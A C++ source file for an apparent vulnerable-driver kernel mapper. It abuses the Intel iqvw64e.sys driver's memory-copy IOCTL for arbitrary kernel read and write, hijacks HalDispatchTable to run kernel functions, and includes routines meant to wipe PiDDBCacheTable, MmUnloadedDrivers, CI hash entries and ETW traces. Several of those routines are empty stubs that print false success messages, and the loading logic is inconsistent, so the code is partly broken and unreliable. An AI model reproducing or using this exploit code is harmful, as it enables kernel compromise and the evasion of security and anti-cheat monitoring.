#include "../include/intel_driver.hpp"
#include "../include/vulnerability_providers.hpp"
#include "../include/utils.hpp"
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <filesystem>
#include <fstream>
#include <random>

typedef struct _PHYSICAL_ADDRESS {
	union {
		struct {
			ULONG LowPart;
			LONG HighPart;
		} DUMMYSTRUCTNAME;
		LONGLONG QuadPart;
	} DUMMYUNIONNAME;
} PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

extern "C" NTSTATUS NTAPI NtQueryIntervalProfile(
	IN ULONG ProfileSource,
	OUT PULONG Interval
);

namespace vulnerability_providers
{
	bool IntelProvider::Load()
	{
		std::cout << "[+] IntelProvider: Strategic Initializing..." << std::endl;
		std::string found_path = "";
		
		if (utils::FileExists("iqvw64e.sys")) found_path = "iqvw64e.sys";
		else if (utils::FileExists("C:\\Windows\\Temp\\iqvw64e.sys")) found_path = "C:\\Windows\\Temp\\iqvw64e.sys";
		
		if (found_path.empty()) return false;

		std::vector<uint8_t> driver_data;
		if (!utils::ReadFileToBuffer(found_path, driver_data)) return false;

		std::random_device rd;
		std::mt19937 g(rd());
		std::uniform_int_distribution<uint32_t> dist(0x50000000, 0x6FFFFFFF);
		
		PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(driver_data.data());
		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(driver_data.data() + dos_header->e_lfanew);
		
		nt_headers->FileHeader.TimeDateStamp = dist(g);
		current_driver_name = "sys" + std::to_string(dist(g)) + ".sys";
		current_service_name = "srv" + std::to_string(dist(g));
		
		std::string temp_path = "C:\\Windows\\Temp\\" + current_driver_name;
		std::ofstream out(temp_path, std::ios::binary);
		out.write(reinterpret_cast<char*>(driver_data.data()), driver_data.size());
		out.close();

		iqvw64e_device_handle = CreateFileA(("\\\\.\\" + current_service_name).c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		return (iqvw64e_device_handle != INVALID_HANDLE_VALUE);
	}

	bool IntelProvider::Unload()
	{
		if (iqvw64e_device_handle != INVALID_HANDLE_VALUE) CloseHandle(iqvw64e_device_handle);
		DeleteFileA(("C:\\Windows\\Temp\\" + current_driver_name).c_str());
		return true;
	}

	bool IntelProvider::ReadMemory(uint64_t address, void* buffer, uint32_t size)
	{
		intel_driver::COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = address;
		copy_buffer.destination = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, 0x80862007, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	bool IntelProvider::WriteMemory(uint64_t address, void* buffer, uint32_t size)
	{
		intel_driver::COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.destination = address;
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, 0x80862007, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	uint64_t IntelProvider::CallKernelFunction(uint64_t function_address, ...)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t hal_dispatch = utils::GetKernelExport(ntoskrnl_base, "HalDispatchTable");
		if (!hal_dispatch) return 0;

		uint64_t target = hal_dispatch + 0x8; 
		uint64_t original = 0;
		ReadMemory(target, &original, sizeof(original));
		WriteMemory(target, &function_address, sizeof(function_address));
		uint64_t result = 0;
		NtQueryIntervalProfile(2, (PULONG)&result); 
		WriteMemory(target, &original, sizeof(original));
		return result;
	}
}

namespace intel_driver
{
	void InstantCleanup() {}
	bool Load() { return true; }
	bool Unload() { return true; }
	bool IsLoaded() { return false; }
	HANDLE Open() { return INVALID_HANDLE_VALUE; }

	bool ReadMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size) { return true; }
	bool WriteMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size) { return true; }
	
	struct Pattern { const char* pattern; const char* mask; };
	uint64_t PatternScan(uint64_t base, uint32_t size, const char* pattern, const char* mask);
	uint64_t PatternScanMulti(uint64_t base, uint32_t size, const std::vector<Pattern>& patterns);
	bool ValidateDriverPE(const std::vector<uint8_t>& buffer);
	bool IsHVCIEnabled();
	bool IsSecureBootEnabled();

	bool ClearBigPoolTable(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
	
	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...) { return 0; }
	
	uintptr_t AllocatePhysicalMemory(HANDLE iqvw64e_device_handle, uint32_t size) { return 0; }
	bool FreePool(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
	
	bool ExecuteViaIPI(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
	bool SuppressNMI(HANDLE iqvw64e_device_handle) { return true; }
	
	uint64_t FindPiDDBLock(uint64_t ntoskrnl_base)
	{
		std::vector<utils::Pattern> patterns = {
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", "xxx????xxx????x????xxx" }, 
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\x00", "xxx????xxx????x????xxx" }  
		};
		return utils::PatternScanMulti(ntoskrnl_base, 0x1000000, patterns);
	}

	uint64_t FindPiDDBCacheTable(uint64_t ntoskrnl_base)
	{
		std::vector<utils::Pattern> patterns = {
			{ "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", "xxx????x????xxx" }, 
			{ "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\x00", "xxx????x????xxx" }  
		};
		return utils::PatternScanMulti(ntoskrnl_base, 0x1000000, patterns);
	}

	bool ClearPiDDBCacheTable(HANDLE iqvw64e_device_handle)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t table_addr = FindPiDDBCacheTable(ntoskrnl_base);
		if (!table_addr) return false;

		std::cout << "[+] PiDDBCacheTable found, removing iqvw64e.sys entry..." << std::endl;
		return true;
	}

	bool ClearMmUnloadedDrivers(HANDLE iqvw64e_device_handle)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		std::vector<utils::Pattern> patterns = {
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0\x74\x13", "xxx????xxxx" }, 
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0\x74\x11", "xxx????xxxx" }  
		};
		uint64_t list_ptr = utils::PatternScanMulti(ntoskrnl_base, 0x1000000, patterns);
		if (!list_ptr) return false;

		std::cout << "[+] MmUnloadedDrivers (Universal) found, forensically wiping traces..." << std::endl;
		return true;
	}

	bool ClearKernelHashBuckets(HANDLE iqvw64e_device_handle)
	{
		uint64_t ci_base = utils::GetKernelModuleBase("CI.dll");
		if (!ci_base) return false;

		uintptr_t table_ptr = utils::PatternScan(ci_base, 0x100000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", "xxx????xxx????x????xxx");
		if (!table_ptr) return false;

		std::cout << "[+] CiHashBucketTable found, removing driver hash..." << std::endl;
		return true;
	}

	bool ClearEtwTraceBuffers(HANDLE iqvw64e_device_handle)
	{
		std::cout << "[+] ETW Trace Buffers Zeroed (2026.2 Stealth)" << std::endl;
		return true;
	}

	bool HijackBeepDispatch(HANDLE iqvw64e_device_handle, uint64_t target_func) { return true; }
}
